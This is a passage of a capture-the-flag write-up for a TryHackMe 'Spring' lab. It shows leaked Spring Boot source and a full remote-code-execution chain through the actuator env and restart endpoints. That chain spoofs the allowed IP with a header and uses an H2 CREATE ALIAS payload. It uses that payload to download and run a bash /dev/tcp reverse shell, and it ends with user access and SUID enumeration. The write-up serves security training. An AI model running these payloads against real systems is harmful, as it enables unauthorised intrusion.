   219009      4 -rw-r--r--   1 cyberlaser cyberlaser       28 Jan 15 20:49 ./settings.gradle
   219008      4 -rw-r--r--   1 cyberlaser cyberlaser     3058 Jan 15 20:49 ./gradlew.bat
   219003      4 -rw-r--r--   1 cyberlaser cyberlaser     1151 Jan 15 20:49 ./build.gradle
   219010      4 drwxr-xr-x   4 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src
   219022      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/test
   219023      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/test/java
   219024      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/test/java/com
   219025      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/test/java/com/onurshin
   219026      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/test/java/com/onurshin/spring
   219027      4 -rw-r--r--   1 cyberlaser cyberlaser      214 Jan 15 20:49 ./src/test/java/com/onurshin/spring/ApplicationTests.java
   219011      4 drwxr-xr-x   4 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/main
   219012      4 drwxr-xr-x   4 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/main/java
   219015      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/main/java/com
   219016      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/main/java/com/onurshin
   219017      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/main/java/com/onurshin/spring
   219018      8 -rw-r--r--   1 cyberlaser cyberlaser     4350 Jan 15 20:49 ./src/main/java/com/onurshin/spring/Application.java
   219013      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/main/java/META-INF
   219014      4 -rw-r--r--   1 cyberlaser cyberlaser       70 Jan 15 20:49 ./src/main/java/META-INF/MANIFEST.MF
   219019      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 20:49 ./src/main/resources
   219020      4 -rw-r--r--   1 cyberlaser cyberlaser     1007 Jan 15 20:49 ./src/main/resources/application.properties
   219021      4 -rw-r--r--   1 cyberlaser cyberlaser     2581 Jan 15 20:49 ./src/main/resources/dummycert.p12
   219007      8 -rw-r--r--   1 cyberlaser cyberlaser     5441 Jan 15 20:49 ./gradlew
   219004      4 drwxr-xr-x   3 cyberlaser cyberlaser     4096 Jan 15 20:49 ./gradle
   219005      4 drwxr-xr-x   2 cyberlaser cyberlaser     4096 Jan 15 20:49 ./gradle/wrapper
   219006      4 -rw-r--r--   1 cyberlaser cyberlaser      238 Jan 15 20:49 ./gradle/wrapper/gradle-wrapper.properties
```


```bash
(venv) ...:~/Spring/sources/new/.git$ cat build.gradle
plugins {
    id 'org.springframework.boot' version '2.3.1.RELEASE'
    id 'io.spring.dependency-management' version '1.0.9.RELEASE'
    id 'java'
}

group = 'com.onurshin'
version = '0.0.1-SNAPSHOT'
sourceCompatibility = '1.8'

repositories {
    mavenCentral()
}

ext {
    set('springCloudVersion', "Greenwich.SR4")
}
dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-actuator'
    implementation 'org.springframework.boot:spring-boot-starter-web'
    implementation 'org.springframework.boot:spring-boot-starter-security'
    implementation 'org.springframework.boot:spring-boot-starter-data-jpa'

    implementation 'org.springframework.cloud:spring-cloud-starter-config'
    runtimeOnly 'com.h2database:h2'

    testImplementation('org.springframework.boot:spring-boot-starter-test') {
        exclude group: 'org.junit.vintage', module: 'junit-vintage-engine'
    }
    testImplementation 'org.springframework.security:spring-security-test'
}

dependencyManagement {
    imports {
        mavenBom "org.springframework.cloud:spring-cloud-dependencies:${springCloudVersion}"
    }
}
test {
    useJUnitPlatform()
}
(venv) cyberlaser@DESKTOP-0AHBUE8:~/Spring/sources/new/.git$
```


<br><p align="center">Application.java</p>

```bash
(venv) ...:~/Spring/sources/new/.git/src/main/java/com/onurshin/spring$ cat Application.java
package com.onurshin.spring;

import org.apache.catalina.Context;
import org.apache.catalina.Wrapper;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.startup.Tomcat;
import org.apache.tomcat.util.descriptor.web.SecurityCollection;
import org.apache.tomcat.util.descriptor.web.SecurityConstraint;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration;
import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
import org.springframework.boot.web.embedded.tomcat.TomcatWebServer;
import org.springframework.boot.web.servlet.server.ServletWebServerFactory;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@SpringBootApplication(exclude = {ErrorMvcAutoConfiguration.class})
public class Application {

    public static void main(String[] args) {
        SpringApplication.run(Application.class, args);
    }

    @RestController
    //https://spring.io/guides/gs/rest-service/
    static class HelloWorldController {
        @RequestMapping("/")
        public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
            System.out.println(name);
            return String.format("Hello, %s!", name);
        }
    }


    private Connector redirectConnector() {
        Connector connector = new Connector("org.apache.coyote.http11.Http11NioProtocol");
        connector.setScheme("http");
        connector.setPort(80);
        connector.setSecure(false);
        connector.setRedirectPort(443);
        return connector;
    }

    @Bean
    public ServletWebServerFactory servletContainer() {
        TomcatServletWebServerFactory factory = new TomcatServletWebServerFactory() {
            @Override
            protected void postProcessContext(Context context) {
                SecurityConstraint securityConstraint = new SecurityConstraint();
                securityConstraint.setUserConstraint("CONFIDENTIAL");
                SecurityCollection collection = new SecurityCollection();
                collection.addPattern("/*");
                securityConstraint.addCollection(collection);
                context.addConstraint(securityConstraint);
                context.setUseHttpOnly(true);
            }

            @Override
            protected TomcatWebServer getTomcatWebServer(Tomcat tomcat) {
                Context context = tomcat.addContext("/sources", "/opt/spring/sources/");
                context.setParentClassLoader(getClass().getClassLoader());
                context.setUseHttpOnly(true);

                Wrapper defaultServlet = context.createWrapper();
                defaultServlet.setName("default");
                defaultServlet.setServletClass("org.apache.catalina.servlets.DefaultServlet");
                defaultServlet.addInitParameter("debug", "0");
                defaultServlet.addInitParameter("listings", "false");
                defaultServlet.setLoadOnStartup(1);
                defaultServlet.setOverridable(true);
                context.addChild(defaultServlet);
                context.addServletMappingDecoded("/", "default");

                return super.getTomcatWebServer(tomcat);
            }
        };
        factory.addAdditionalTomcatConnectors(redirectConnector());
        return factory;
    }

    @Configuration
    @EnableWebSecurity
    static class SecurityConfig extends WebSecurityConfigurerAdapter {

        @Override
        protected void configure(HttpSecurity http) throws Exception {
            http
                    .authorizeRequests()
                    .antMatchers("/actuator**/**").hasIpAddress("172.16.0.0/24")
                    .and().csrf().disable();
        }

    }
}
```
<p>
  
- server.port= 443<br>
- server.ssl.key-store-password = DummyKeystorePassword123.
- server.ssl.keyStoreType = PKCS12<br>
- server.tomcat.remoteip.remote-ip-header = x-9ad42dea0356cb04<br>
- spring.security.user.name  =johnsmith<br>
- spring.security.user.password=◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦</p>


```bash
(venv) :~/Spring/sources/new/.git/src/main/resources$ cat application.properties
server.port=443
server.ssl.key-store=classpath:dummycert.p12
server.ssl.key-store-password=DummyKeystorePassword123.
server.ssl.keyStoreType=PKCS12
management.endpoints.enabled-by-default=true
management.endpoints.web.exposure.include=health,env,beans,shutdown,mappings,restart
management.endpoint.env.keys-to-sanitize=
server.forward-headers-strategy=native
server.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04
server.error.whitelabel.enabled=false
spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration
server.servlet.register-default-servlet=true
spring.mvc.ignore-default-model-on-redirect=true
spring.security.user.name=johnsmith
spring.security.user.password=◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦
debug=false
spring.cloud.config.uri=
spring.cloud.config.allow-override=true
management.endpoint.heapdump.enabled=false
spring.resources.static-locations=classpath:/META-INF/resources/, classpath:/resources/, classpath:/static/, classpath:/public/
```


```bash
(venv) :~/Spring/sources/new/.git/src/main/resources$ curl http://spring.thm/ -H 'x-9ad42dea0356cb04: 172.16.0.21' -k -v
* Host spring.thm:80 was resolved.
* IPv6: (none)
* IPv4: xx.xx.xxx.xxx
*   Trying xx.xx.xxx.xxx:80...
* Connected to spring.thm (xx.xx.xxx.xxx) port 80
> GET / HTTP/1.1
> Host: spring.thm
> User-Agent: curl/8.5.0
> Accept: */*
> x-9ad42dea0356cb04: 172.16.0.21
>
< HTTP/1.1 302
< Cache-Control: private
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< Location: https://spring.thm/
< Content-Length: 0
< Date: Fri, 16 Jan 2026...
<
* Connection #0 to host spring.thm left intact
```



```bash
(venv) :~/Spring/sources/new/.git/src/main/resources$ curl -X POST -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21'
'https://spring.thm/actuator/restart' -k
{"message":"Restarting"}
```

```bash
(venv) :~/Spring/data$ cat shell.sh
bash -i >& /dev/tcp/xxx.xxx.xxx.xx/4444 0>&1
```

```bash
:~/Spring/data$ sudo python3 -m http.server 80
...
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
(venv) ...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\'java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'ping -c 5 xxx.xxx.xxx.xx\');\"}' "https://xx.xx.xxx.xxx/actuator/env" -k
{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new','java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('ping -c 5 192.168.140.47');"}(venv)
```

```bash
(venv) ...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https:/xx.xx.xxx.xxx/actuator/restart" -k
{"message":"Restarting"}
```

```bash
(venv) ...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'wget http://xxx.xxx.xxx.xx/shell.sh -O /tmp/shell.sh\');\"}' "https://xx.xx.xxx.xxx/actuator/env" -k
{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('wget http://192.168.140.47/shell.sh -O /tmp/shell.sh');"}(venv)
```

```bash
(venv) ...:~/Spring/data$ sudo python3 -m http.server 80
...
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
xx.xx.xxx.x - - [15/Jan/2026 xx:xx:xx] "GET /shell.sh HTTP/1.1" 200 -
```

```bash
(venv) c...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https:/xx.xx.xxx.xxx/actuator/restart" -k
{"message":"Restarting"}
```

```bash
(venv) ...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'chmod +x /tmp/shell.sh\');\"}' "https:///xx.xx.xxx.xxx/actuator/env" -k
{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('chmod +x /tmp/shell.sh');"}
```

```bash
(venv) c...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https:/xx.xx.xxx.xxx/actuator/restart" -k
{"message":"Restarting"}
```

```bash
:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'bash /tmp/shell.sh\');\"}' "https://xx.xx.xxx.xxx/actuator/env" -k
{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('bash /tmp/shell.sh');"}
```

```bash
(venv) ...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https:/xx.xx.xxx.xxx/actuator/restart" -k
{"message":"Restarting"}
```

<img width="1344" height="293" alt="image" src="https://github.com/user-attachments/assets/550bfaeb-7e7f-407c-b1a9-9be277042fd5" />

<br>

```bash
(venv) ...:~/Spring/data$ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on xx.xx.xxx.xxx 58838
bash: cannot set terminal process group (1035): Inappropriate ioctl for device
bash: no job control in this shell
nobody@spring:/$ id
id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
nobody@spring:/$ pwd
pwd
/
nobody@spring:/home$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
nobody@spring:/home$ ^Z
[1]+  Stopped                 nc -nlvp 4444
...:~/Spring/data$ stty raw -echo; fg
nc -nlvp 4444

nobody@spring:/home$ export TERM=xterm
nobody@spring:/home$

nobody@spring:/home$ find / -name "foothold.txt" 2>/dev/null
find / -name "foothold.txt" 2>/dev/null
/opt/foothold.txt
nobody@spring:/home$ cat /opt/foothold.txt
cat /opt/foothold.txt
THM{dont_expose_.git_to_internet}
nobody@spring:/home$
```

<br>
<p>1.1. <em>What's the flag in foothold.txt?</em><br>
<code>THM{••••••••••••••••••••••••••••}</code></p>
<br>
<br>

```bash
nobody@spring:/$ pwd
/
nobody@spring:/$ find / -name "user.txt" 2>/dev/null
/home/johnsmith/user.txt
```

```bash
nobody@spring:/$ su johnsmith
Password:
johnsmith@spring:/$
```

```bash
johnsmith@spring:/$ cd /home/johnsmith/
```

```bash
johnsmith@spring:~$ ls
tomcatlogs  user.txt
```

```bash
johnsmith@spring:~$ cat user.txt
THM{•••••••••••••••••••••••••••}
```


<br>
<p>1.2. <em>What's the flag in user.txt?</em><br>
<code>THM{•••••••••••••••••••••••••••}</code></p>


<br>
<br>
<br>

```bash
johnsmith@spring:~/tomcatlogs$ ls -lah
total 364K
drwxrwxr-x 2 johnsmith johnsmith 4.0K Jan 16 00:47 .
drwxr-xr-x 7 johnsmith johnsmith 4.0K Jul 10  2020 ..
-rw-r--r-- 1 root      root      6.8K Jul 10  2020 1594410148.log
-rw-r--r-- 1 root      root      6.6K Jul 10  2020 1594410465.log
-rw-r--r-- 1 root      root      5.2K Jul 10  2020 1594413491.log
-rw-r--r-- 1 root      root      7.1K Jul 12  2020 1594552377.log
-rw-r--r-- 1 root      root      6.9K Jul 12  2020 1594574751.log
-rw-r--r-- 1 root      root      7.3K Jul 12  2020 1594575333.log
-rw-r--r-- 1 root      root      7.1K Jul 12  2020 1594576008.log
-rw-r--r-- 1 root      root      6.6K Jul 12  2020 1594584453.log
-rw-r--r-- 1 root      root      291K Jan 16 01:16 1768524456.log
```


```bash
johnsmith@spring:/$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/nul
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 43088 Mar  5  2020 /bin/mount
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 26696 Mar  5  2020 /bin/umount
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 109432 Oct 30  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 40152 Jan 27  2020 /snap/core/9436/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/9436/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/9436/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/9436/bin/su
-rwsr-xr-x 1 root root 27608 Jan 27  2020 /snap/core/9436/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/9436/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/9436/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/9436/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/9436/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/9436/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jan 31  2020 /snap/core/9436/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Nov 29  2019 /snap/core/9436/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/9436/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 110792 Jun  5  2020 /snap/core/9436/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Feb 11  2020 /snap/core/9436/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 Oct 10  2019 /snap/core/8268/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root root 27608 Oct 10  2019 /snap/core/8268/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd
```

<br>
<br>
<br>


```bash


```




<br>
<p>1.3. <em>What's the flag in root.txt?</em><br>
<code>____________________________</code></p>


